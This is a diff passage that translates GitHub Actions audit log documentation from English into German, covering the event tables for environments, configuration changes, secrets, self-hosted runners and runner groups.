+| `environment.delete` | Wird ausgelöst, wenn eine Umgebung gelöscht wird. Weitere Informationen findest du unter [Deleting an environment](/actions/reference/environments#deleting-an-environment) („Löschen einer Umgebung“).
+| `environment.remove_actions_secret` |  Wird ausgelöst, wenn ein Geheimnis aus einer Umgebung entfernt wird. Weitere Informationen findest du unter [Environment secrets](/actions/reference/environments#environment-secrets) („Umgebungsgeheimnisse“).
+| `environment.update_actions_secret` | Wird ausgelöst, wenn ein Geheimnis in einer Umgebung aktualisiert wird. Weitere Informationen findest du unter [Environment secrets](/actions/reference/environments#environment-secrets) („Umgebungsgeheimnisse“).
 {% endif %}
 
 {% ifversion fpt or ghes or ghec %}
-### Events for configuration changes
-| Action | Description
+### Ereignisse für Konfigurationsänderungen
+| Aktion | BESCHREIBUNG
 |------------------|-------------------
-| `repo.actions_enabled` | Triggered when {% data variables.product.prodname_actions %} is enabled for a repository. Can be viewed using the UI. This event is not visible when you access the audit log using the REST API. For more information, see "[Using the REST API](#using-the-rest-api)."
-| `repo.update_actions_access_settings` | Triggered when the setting to control how your repository is used by {% data variables.product.prodname_actions %} workflows in other repositories is changed.
+| `repo.actions_enabled` | Wird ausgelöst, wenn {% data variables.product.prodname_actions %} für ein Repository aktiviert wird. Kann über die Benutzeroberfläche angezeigt werden. Dieses Ereignis ist nicht sichtbar, wenn du über die REST-API auf das Überwachungsprotokoll zugreifst. Weitere Informationen findest du unter [Using the REST API](#using-the-rest-api) („Verwenden der REST-API“).
+| `repo.update_actions_access_settings` | Wird ausgelöst, wenn die Einstellung geändert wird, die steuert, wie dein Repository von {% data variables.product.prodname_actions %}-Workflows in anderen Repositorys verwendet wird.
 {% endif %}
 
-### Events for secret management
-| Action | Description
+### Ereignisse für die Verwaltung von Geheimnissen
+| Aktion | BESCHREIBUNG
 |------------------|-------------------
-| `org.create_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is created for an organization. For more information, see "[Creating encrypted secrets for an organization](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)."
-| `org.remove_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is removed.
-| `org.update_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is updated.
-| `repo.create_actions_secret ` | Triggered when a {% data variables.product.prodname_actions %} secret is created for a repository. For more information, see "[Creating encrypted secrets for a repository](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)."
-| `repo.remove_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is removed.
-| `repo.update_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is updated.
+| `org.create_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis für eine Organisation erstellt wird. Weitere Informationen findest du unter [Creating encrypted secrets for an organization](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization) („Erstellen von verschlüsselten Geheimnissen für eine Organisation“).
+| `org.remove_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis entfernt wird.
+| `org.update_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis aktualisiert wird.
+| `repo.create_actions_secret ` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis für ein Repository erstellt wird. Weitere Informationen findest du unter [Creating encrypted secrets for a repository](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository) („Erstellen von verschlüsselten Geheimnissen für ein Repository“).
+| `repo.remove_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis entfernt wird.
+| `repo.update_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis aktualisiert wird.
 
-### Events for self-hosted runners
-| Action | Description
+### Ereignisse für selbstgehostete Runner
+| Aktion | BESCHREIBUNG
 |------------------|-------------------
-| `enterprise.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to an enterprise](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)."
-| `enterprise.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed.
-| `enterprise.runner_group_runners_updated` | Triggered when a runner group's member list is updated. For more information, see "[Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)."
-| `enterprise.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `enterprise.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `enterprise.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI. This event is not included when you export the audit log as JSON data or a CSV file. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" and "[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)."
-| `org.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to an organization](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)."
-| `org.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed. For more information, see [Removing a runner from an organization](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).
-| `org.runner_group_runners_updated` | Triggered when a runner group's list of members is updated. For more information, see "[Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)."
-| `org.runner_group_updated` | Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
-| `org.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `org.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `org.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."
-| `repo.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to a repository](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)."
-| `repo.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed. For more information, see "[Removing a runner from a repository](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)."
-| `repo.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `repo.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `repo.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."
+| `enterprise.register_self_hosted_runner` | Wird ausgelöst, wenn ein neuer selbstgehosteter Runner registriert wird. Weitere Informationen findest du unter [Adding a self-hosted runner to an enterprise](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise) („Hinzufügen eines selbstgehosteten Runners zu einem Unternehmen“).
+| `enterprise.remove_self_hosted_runner` | Wird ausgelöst, wenn ein selbstgehosteter Runner entfernt wird.
+| `enterprise.runner_group_runners_updated` | Wird ausgelöst, wenn die Mitgliederliste einer Runnergruppe aktualisiert wird. Weitere Informationen findest du unter [Festlegen selbstgehosteter Runner in einer Gruppe für eine Organisation](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization).
+| `enterprise.self_hosted_runner_online` | Wird ausgelöst, wenn die Runneranwendung gestartet wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) („Überprüfen des Status eines selbstgehosteten Runners“).
+| `enterprise.self_hosted_runner_offline` | Wird ausgelöst, wenn die Runneranwendung angehalten wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Überprüfen des Status eines selbstgehosteten Runners](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
+| `enterprise.self_hosted_runner_updated` | Wird ausgelöst, wenn die Runneranwendung aktualisiert wird. Kann über die REST-API und die Benutzeroberfläche angezeigt werden. Dieses Ereignis ist nicht enthalten, wenn du das Überwachungsprotokoll als JSON-Daten oder CSV-Datei exportierst. Weitere Informationen findest du unter [About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners) („Informationen zu selbstgehosteten Runnern“) und [Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log) („Überprüfen des Überwachungsprotokolls für deine Organisation“).
+| `org.register_self_hosted_runner` | Wird ausgelöst, wenn ein neuer selbstgehosteter Runner registriert wird. Weitere Informationen findest du unter [Adding a self-hosted runner to an organization](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization) („Hinzufügen eines selbstgehosteten Runners zu einer Organisation“).
+| `org.remove_self_hosted_runner` | Wird ausgelöst, wenn ein selbstgehosteter Runner entfernt wird. Weitere Informationen findest du unter [Removing a runner from an organization](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization) („Entfernen eines Runners aus einer Organisation“).
+| `org.runner_group_runners_updated` | Wird ausgelöst, wenn die Mitgliederliste einer Runnergruppe aktualisiert wird. Weitere Informationen findest du unter [Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization) („Festlegen von selbstgehosteten Runnern in einer Gruppe für eine Organisation“).
+| `org.runner_group_updated` | Wird ausgelöst, wenn die Konfiguration einer selbstgehosteten Runnergruppe geändert wird. Weitere Informationen findest du unter [Ändern der Zugriffsrichtlinie einer selbstgehosteten Runnergruppe](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group).
+| `org.self_hosted_runner_online` | Wird ausgelöst, wenn die Runneranwendung gestartet wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) („Überprüfen des Status eines selbstgehosteten Runners“).
+| `org.self_hosted_runner_offline` | Wird ausgelöst, wenn die Runneranwendung angehalten wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Überprüfen des Status eines selbstgehosteten Runners](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
+| `org.self_hosted_runner_updated` | Wird ausgelöst, wenn die Runneranwendung aktualisiert wird. Kann über die REST-API und die Benutzeroberfläche angezeigt werden. Im JSON-/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter „[Informationen zu selbstgehosteten Runnern](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)“.
+| `repo.register_self_hosted_runner` | Wird ausgelöst, wenn ein neuer selbstgehosteter Runner registriert wird. Weitere Informationen findest du unter [Adding a self-hosted runner to a repository](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository) („Hinzufügen eines selbstgehosteten Runners zu einem Repository“).
+| `repo.remove_self_hosted_runner` | Wird ausgelöst, wenn ein selbstgehosteter Runner entfernt wird. Weitere Informationen findest du unter [Entfernen eines Runners aus einem Repository](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository).
+| `repo.self_hosted_runner_online` | Wird ausgelöst, wenn die Runneranwendung gestartet wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) („Überprüfen des Status eines selbstgehosteten Runners“).
+| `repo.self_hosted_runner_offline` | Wird ausgelöst, wenn die Runneranwendung angehalten wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Überprüfen des Status eines selbstgehosteten Runners](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
+| `repo.self_hosted_runner_updated` | Wird ausgelöst, wenn die Runneranwendung aktualisiert wird. Kann über die REST-API und die Benutzeroberfläche angezeigt werden. Im JSON-/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter „[Informationen zu selbstgehosteten Runnern](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)“.
 
-### Events for self-hosted runner groups
-| Action | Description
+### Ereignisse für selbstgehostete Runnergruppen
+| Aktion | BESCHREIBUNG
 |------------------|-------------------
-| `enterprise.runner_group_created` | Triggered when a self-hosted runner group is created. For more information, see "[Creating a self-hosted runner group for an enterprise](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)."
-| `enterprise.runner_group_removed` | Triggered when a self-hosted runner group is removed. For more information, see "[Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)."
-| `enterprise.runner_group_runner_removed` | Triggered when the REST API is used to remove a self-hosted runner from a group.
-| `enterprise.runner_group_runners_added` | Triggered when a self-hosted runner is added to a group. For more information, see "[Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)."
-| `enterprise.runner_group_updated` |Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
-| `org.runner_group_created` | Triggered when a self-hosted runner group is created. For more information, see "[Creating a self-hosted runner group for an organization](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)."
-| `org.runner_group_removed` | Triggered when a self-hosted runner group is removed. For more information, see "[Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)."
-| `org.runner_group_updated` | Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
-| `org.runner_group_runners_added` | Triggered when a self-hosted runner is added to a group. For more information, see "[Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)."
-| `org.runner_group_runner_removed` | Triggered when the REST API is used to remove a self-hosted runner from a group. For more information, see "[Remove a self-hosted runner from a group for an organization](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)."
+| `enterprise.runner_group_created` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe erstellt wird. Weitere Informationen findest du unter [Creating a self-hosted runner group for an enterprise](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise) („Erstellen einer selbstgehosteten Runnergruppe für ein Unternehmen“).
+| `enterprise.runner_group_removed` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe entfernt wird. Weitere Informationen findest du unter [Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group) („Entfernen einer selbstgehosteten Runnergruppe“).
+| `enterprise.runner_group_runner_removed` | Wird ausgelöst, wenn die REST-API verwendet wird, um einen selbstgehosteten Runner aus einer Gruppe zu entfernen.
+| `enterprise.runner_group_runners_added` | Wird ausgelöst, wenn ein selbstgehosteter Runner zu einer Gruppe hinzugefügt wird. Weitere Informationen findest du unter [Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group) („Verschieben eines selbstgehosteten Runners in eine Gruppe“).
+| `enterprise.runner_group_updated` |Wird ausgelöst, wenn die Konfiguration einer selbstgehosteten Runnergruppe geändert wird. Weitere Informationen findest du unter [Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) („Ändern der Zugriffsrichtlinie einer selbstgehosteten Runnergruppe“).
+| `org.runner_group_created` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe erstellt wird. Weitere Informationen findest du unter [Creating a self-hosted runner group for an organization](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization) („Erstellen einer selbstgehosteten Runnergruppe für eine Organisation“).
+| `org.runner_group_removed` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe entfernt wird. Weitere Informationen findest du unter [Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group) („Entfernen einer selbstgehosteten Runnergruppe“).
+| `org.runner_group_updated` | Wird ausgelöst, wenn die Konfiguration einer selbstgehosteten Runnergruppe geändert wird. Weitere Informationen findest du unter [Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) („Ändern der Zugriffsrichtlinie einer selbstgehosteten Runnergruppe“).
+| `org.runner_group_runners_added` | Wird ausgelöst, wenn ein selbstgehosteter Runner zu einer Gruppe hinzugefügt wird. Weitere Informationen findest du unter [Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group) („Verschieben eines selbstgehosteten Runners in eine Gruppe“).
+| `org.runner_group_runner_removed` | Wird ausgelöst, wenn die REST-API verwendet wird, um einen selbstgehosteten Runner aus einer Gruppe zu entfernen. Weitere Informationen findest du unter [Remove a self-hosted runner from a group for an organization](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization) („Entfernen eines selbstgehosteten Runners aus einer Gruppe für eine Organisation“).
 
-### Events for workflow activities
+### Ereignisse für Workflowaktivitäten
 
 {% data reusables.actions.actions-audit-events-workflow %}
